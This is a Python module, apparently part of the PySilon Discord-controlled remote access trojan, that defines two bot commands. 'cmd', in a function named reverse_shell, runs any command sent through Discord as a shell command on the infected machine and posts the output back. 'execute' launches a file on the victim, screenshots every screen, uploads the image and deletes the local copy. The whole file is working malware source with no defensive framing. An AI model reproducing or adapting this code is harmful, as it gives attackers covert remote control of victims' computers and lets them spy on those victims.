import resources.modules.misc as pysilon_misc
from PIL import ImageGrab
import subprocess
import asyncio
import os

@client.command(name="cmd")
async def reverse_shell(ctx, cmd_command=None):
    await ctx.message.delete()
    if cmd_command != None:
        cmd_output = pysilon_misc.force_decode(subprocess.run(ctx.message.content[5:], capture_output= True, shell= True).stdout).strip()
        message_buffer = ''
        await ctx.send('```Executed command: ' + ctx.message.content[5:] + '\nstdout:```');
        for line in range(1, len(cmd_output.split('\n'))):
            if len(message_buffer) + len(cmd_output.split('\n')[line]) > 1950:
                await ctx.send('```' + message_buffer + '```');
                message_buffer = cmd_output.split('\n')[line]
            else:
                message_buffer += cmd_output.split('\n')[line] + '\n'
        await ctx.send('```' + message_buffer + '```');
        await ctx.send('```End of command stdout```');
    else:
        return await ctx.send("```No command was given.```")

@client.command(name="execute")
async def execute_file(ctx, file_to_exec=None):
    await ctx.message.delete()
    if ctx.message.channel.id == channel_ids['file']:
        if file_to_exec != None:
            if os.path.exists(ctx.message.content[9:]):
                try:
                    subprocess.run('start "" "' + ctx.message.content[9:] + '"', shell=True)
                    await asyncio.sleep(1)
                    ImageGrab.grab(all_screens=True).save('ss.png')
                    await ctx.send(embed=discord.Embed(title=pysilon_misc.current_time() + ' `[Executed: ' + ctx.message.content[9:] + ']`').set_image(url='attachment://ss.png'), file=discord.File('ss.png'))
                    subprocess.run('del ss.png', shell=True)
                    await ctx.send('```Successfully executed: ' + ctx.message.content[9:] + '```')
                except Exception as e:
                    await ctx.send(f'```❗ Something went wrong...```\n{str(e)}')
            else:
                await ctx.send('```❗ File or directory not found.```')
        else: return await ctx.send('```Syntax: .execute <filename>```')
    else: await ctx.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||')